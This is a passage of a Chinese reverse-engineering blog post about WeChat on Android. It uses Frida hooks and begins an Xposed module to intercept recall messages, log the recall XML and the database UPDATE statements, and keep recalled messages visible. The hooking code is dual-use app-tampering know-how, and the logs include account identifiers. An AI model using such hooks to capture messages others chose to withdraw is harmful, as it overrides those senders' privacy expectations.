old_revoke_str.<span class="title function_">indexOf</span>(sub_str);</span><br><span class="line">                <span class="keyword">var</span> new_revoke_str = old_revoke_str.<span class="title function_">substring</span>(<span class="number">0</span>, index - <span class="number">7</span>) + revoke_msg + old_revoke_str.<span class="title function_">substring</span>(index);</span><br><span class="line">                <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(new_revoke_str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> revoke_xml_obj = <span class="title class_">Java</span>.<span class="title function_">cast</span>(v0.<span class="property">GYI</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.deo&quot;</span>));</span><br><span class="line">    </span><br><span class="line">            revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span> = <span class="title function_">modify_revoke_str</span>(revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>手机上撤回提示也确实被修改</p><p><img src="assets/image-20240611165936122.png" alt="image-20240611165936122"></p><p>因为聊天界面发生了改变，所以这里又回到了hook notifyDataSetChanged，json打印最后消息</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">notifyDataSetChanged_json</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.ui.chatting.a.a&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">notifyDataSetChanged</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;notifyDataSetChanged&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> data = <span class="variable language_">this</span>.<span class="property">LtF</span>.<span class="property">value</span>;</span><br><span class="line">            <span class="comment">//console.log(&quot;Ltf&quot;,data);</span></span><br><span class="line">            <span class="keyword">var</span> data_size = data.<span class="title function_">size</span>();</span><br><span class="line">            <span class="comment">//console.log(&quot;data_size&quot;,data_size);</span></span><br><span class="line">            <span class="keyword">var</span> last_msg=<span class="title class_">Java</span>.<span class="title function_">cast</span>(data.<span class="title function_">get</span>(data_size-<span class="number">1</span>),<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(gson.$new().<span class="title function_">toJson</span>(last_msg));</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">notifyDataSetChanged</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现撤回消息与撤回提示，仅有<code>field_content&quot;</code>、<code>&quot;field_type&quot;</code>、<code>&quot;exe&quot;</code>字段不一样，其中正常消息的<code>field_type=1,exe=true</code>；撤回提示<code>field_type=10000,exe=false</code></p><p>被撤回消息和撤回消息的提示的<code>field_msgSvrId</code>字段是一样的，同时对应着撤回提示xml的<code>&lt;newmsgid&gt;</code>字段</p><p>尝试修改撤回提示的<code>&lt;newmsgid&gt;</code>字段，发现没有什么用。直接就变成不撤回了。</p><p>分析下一个方法：</p><p><code>com.tencent.mm.model.f.a</code>,跟进</p><p><img src="assets/image-20240611185630564.png" alt="image-20240611185630564"></p><p><img src="assets/image-20240611190920135.png" alt="image-20240611190920135"></p><p>参数一为字符串String，通过翻阅知道是 str = M.get(“.sysmsg.$type”)</p><ul><li>即获取的是xml中<code>sysmsg</code>的<code>type</code>属性</li><li>撤回消息就为<code>&quot;revokemsg&quot;</code></li></ul><p>参数二是一个XML内容转成的Map数组</p><p>参数三保存着原始的所有数据</p><p>打印参数代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_fa</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&#x27;/data/local/tmp/r0gson.dex&#x27;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.r0ysue.gson.Gson&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.model.f&quot;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arguments[0]:&quot;</span>+<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arguments[1]:&quot;</span>+gson.$new().<span class="title function_">toJson</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>]));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===============&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arguments[2]:&quot;</span>+gson.$new().<span class="title function_">toJson</span>(<span class="variable language_">arguments</span>[<span class="number">2</span>]));</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数如下</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">arguments[<span class="number">0</span>]:revokemsg  <span class="operator">//</span>撤回消息 类型就是revokemsg</span><br><span class="line"></span><br><span class="line">arguments[<span class="number">1</span>]:&#123;<span class="string">&quot;</span></span><br><span class="line"><span class="string">.sysmsg.revokemsg.newmsgid&quot;</span>:<span class="string">&quot;7006750091473010700&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg&quot;</span>:<span class="string">&quot;<span class="char escape_">\n</span><span class="char escape_">\t</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg.session&quot;</span>:<span class="string">&quot;wxid_0wk809ov49tq22&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg&quot;</span>:<span class="string">&quot;<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.$type&quot;</span>:<span class="string">&quot;revokemsg&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg.replacemsg&quot;</span>:<span class="string">&quot;<span class="char escape_">\&quot;</span>G08aT<span class="char escape_">\&quot;</span> 撤回了一条消息&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg.msgid&quot;</span>:<span class="string">&quot;1632163930&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">arguments[<span class="number">2</span>]:&#123;</span><br><span class="line"><span class="string">&quot;gpg&quot;</span>:&#123;<span class="string">&quot;CreateTime&quot;</span>:<span class="number">1718103677</span>,</span><br><span class="line"><span class="string">&quot;GYG&quot;</span>:                        &#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_0wk809ov49tq22&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;GYH&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_5yg9b4aw7fo422&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;GYI&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003csysmsg type<span class="char escape_">\u</span>003d<span class="char escape_">\&quot;</span>revokemsg<span class="char escape_">\&quot;</span><span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003crevokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003csession<span class="char escape_">\u</span>003ewxid_0wk809ov49tq22<span class="char escape_">\u</span>003c/session<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cmsgid<span class="char escape_">\u</span>003e1632163930<span class="char escape_">\u</span>003c/msgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cnewmsgid<span class="char escape_">\u</span>003e7006750091473010700<span class="char escape_">\u</span>003c/newmsgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003creplacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c![CDATA[<span class="char escape_">\&quot;</span>G08aT<span class="char escape_">\&quot;</span> 撤回了一条消息]]<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/replacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/revokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/sysmsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYJ&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;GYK&quot;</span>:&#123;<span class="string">&quot;hasBuffer&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hasILen&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;iLen&quot;</span>:<span class="number">0</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,<span class="string">&quot;GYL&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003cmsgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003ctmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cpublisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/publisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/tmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/msgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;GYN&quot;</span>:<span class="number">801939133</span>,</span><br><span class="line"><span class="string">&quot;nNf&quot;</span>:<span class="number">3</span>,</span><br><span class="line"><span class="string">&quot;vkP&quot;</span>:<span class="number">10002</span>,</span><br><span class="line"><span class="string">&quot;ysP&quot;</span>:<span class="number">1632163931</span>,</span><br><span class="line"><span class="string">&quot;ysR&quot;</span>:<span class="number">3101589936</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>:[省略...],</span><br><span class="line"><span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;hQb&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hQc&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hQd&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hQe&quot;</span>:<span class="number">0</span>,<span class="string">&quot;hQf&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;what&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><p>发现大致也是对参数一类型进行判断，最后进行这里</p><p><img src="assets/image-20240611191147091.png" alt="image-20240611191147091"></p><p>发现把map里的数据都进行了赋值操作。</p><p>往下看 发现下图</p><p><img src="assets/image-20240611191500559.png" alt="image-20240611191500559"></p><p>跟进这个a方法，会发现调用了三次update()方法，最后跟到<code>updateWithOnConflict</code>方法</p><p><img src="assets/image-20240611192549530.png" alt="image-20240611192549530"></p><p>打印一下调用栈，如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.wcdb</span><span class="selector-class">.database</span><span class="selector-class">.SQLiteDatabase</span><span class="selector-class">.updateWithOnConflict</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.wcdb</span><span class="selector-class">.database</span><span class="selector-class">.SQLiteDatabase</span><span class="selector-class">.update</span>(SourceFile:<span class="number">1726</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storagebase</span><span class="selector-class">.f</span><span class="selector-class">.update</span>(SourceFile:<span class="number">895</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storagebase</span><span class="selector-class">.h</span><span class="selector-class">.update</span>(SourceFile:<span class="number">601</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storage</span><span class="selector-class">.ca</span><span class="selector-class">.a</span>(SourceFile:<span class="number">2426</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.storage</span><span class="selector-class">.ca</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">2187</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.ch</span><span class="selector-class">.b</span>(SourceFile:<span class="number">258</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.model</span><span class="selector-class">.ch</span><span class="selector-class">.b</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.s</span><span class="selector-class">.b</span><span class="selector-class">.b</span>(SourceFile:<span class="number">40</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.s</span><span class="selector-class">.b</span><span class="selector-class">.b</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.processAddMsg</span>(SourceFile:<span class="number">165</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.processAddMsg</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">1059</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(SourceFile:<span class="number">118</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.messenger</span><span class="selector-class">.foundation</span><span class="selector-class">.f</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.zero</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(SourceFile:<span class="number">57</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.plugin</span><span class="selector-class">.zero</span><span class="selector-class">.c</span><span class="selector-class">.a</span>(Native Method)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.modelmulti</span>.q<span class="variable">$a</span>$<span class="number">1</span><span class="selector-class">.onTimerExpired</span>(SourceFile:<span class="number">830</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span><span class="selector-class">.aw</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">86</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.handleMessage</span>(SourceFile:<span class="number">362</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Handler</span><span class="selector-class">.dispatchMessage</span>(Handler<span class="selector-class">.java</span>:<span class="number">106</span>)</span><br><span class="line">com<span class="selector-class">.tencent</span><span class="selector-class">.mm</span><span class="selector-class">.sdk</span><span class="selector-class">.platformtools</span>.aq$<span class="number">2</span><span class="selector-class">.dispatchMessage</span>(SourceFile:<span class="number">350</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.Looper</span><span class="selector-class">.loop</span>(Looper<span class="selector-class">.java</span>:<span class="number">164</span>)</span><br><span class="line">android<span class="selector-class">.os</span><span class="selector-class">.HandlerThread</span><span class="selector-class">.run</span>(HandlerThread<span class="selector-class">.java</span>:<span class="number">65</span>)</span><br></pre></td></tr></table></figure><p>其实通过上面打印notifyDataSetChanged观察也知道自己发消息撤回提示是10002，他人发消息撤回是10000</p><p><code>updateWithOnConflict()</code>方法将参数进行sql的拼接，然后使用<code>new SQLiteStatement()</code>创建<code>SQLiteStatement</code>对象，再用<code>executeUpdateDelete()</code>来执行</p><p>Frida hook一下<code>executeUpdateDelete()</code>方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_executeUpdateDelete</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.wcdb.database.SQLiteStatement&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">executeUpdateDelete</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// console.log(&quot;====================&quot;);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;====================&quot;);</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;7.1.1.1 executeUpdateDelete&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;msql:&quot;</span>, <span class="variable language_">this</span>.<span class="property">mSql</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Args:&quot;</span>, <span class="variable language_">this</span>.<span class="property">mBindArgs</span>.<span class="property">value</span>)</span><br><span class="line">            <span class="comment">//console.log(&quot;mDatabase:&quot;,this.mDatabase.value);</span></span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">executeUpdateDelete</span>.<span class="title function_">overload</span>().<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>撤回消息，打印结果为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">7</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> executeUpdateDelete</span><br><span class="line"><span class="attribute">msql</span>: UPDATE message SET msgId=?,type=?,content=? WHERE msgId=?</span><br><span class="line"><span class="attribute">Args</span>: <span class="number">1948</span>,<span class="number">10000</span>,<span class="string">&quot;G08aT&quot;</span> 撤回了一条消息,<span class="number">1948</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">7</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> executeUpdateDelete</span><br><span class="line"><span class="attribute">msql</span>: UPDATE rconversation SET msgType=?,flag=?,digestUser=?,digest=?,isSend=?,hasTrunc=?,unReadCount=?,conversationTime=?,content=?,username=?,status=? WHERE username=?</span><br><span class="line"><span class="attribute">Args</span>: <span class="number">10000</span>,<span class="number">1718105683000</span>,,<span class="string">&quot;G08aT&quot;</span> 撤回了一条消息:…,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1718105683000</span>,<span class="string">&quot;G08aT&quot;</span> 撤回了一条消息:…,wxid_0wk809ov49tq22,<span class="number">3</span>,wxid_0wk809ov49tq22</span><br><span class="line"></span><br><span class="line"><span class="attribute">7</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> executeUpdateDelete</span><br><span class="line"><span class="attribute">msql</span>: UPDATE rconversation SET UnReadInvite=?,atCount=? WHERE username= ?</span><br><span class="line"><span class="attribute">Args</span>: <span class="number">0</span>,<span class="number">0</span>,wxid_0wk809ov49tq22</span><br></pre></td></tr></table></figure><p>其中的参数<code>msgId</code>是本地的消息id，只有第一条数据库操作指令是<code>WHERE msgId=?</code>的，所以这一步就是找到指定消息然后替换为撤回提示消息。</p><h3 id="xposed实现撤回提示">xposed实现撤回提示</h3><p>不知道为什么我frida打印会出现一次WHERE msgId=?，而手机中却实际出现两次。</p><p>所以哲佬的代码我的结果实现的不是很好，做很很很简单的修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">package com.example.xposed;</span><br><span class="line">//xposed全局过滤</span><br><span class="line">import android.util.Log;</span><br><span class="line">import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XC_MethodHook;</span><br><span class="line">import de.robv.android.xposed.XC_MethodReplacement;</span><br><span class="line">import de.robv.android.xposed.XposedBridge;</span><br><span class="line">import de.robv.android.xposed.XposedHelpers;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line">public class Myhook implements IXposedHookLoadPackage &#123;</span><br><span class="line">    int cnt=1;</span><br><span class="line">    @Override</span><br><span class="line">    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable &#123;</span><br><span class="line">        if 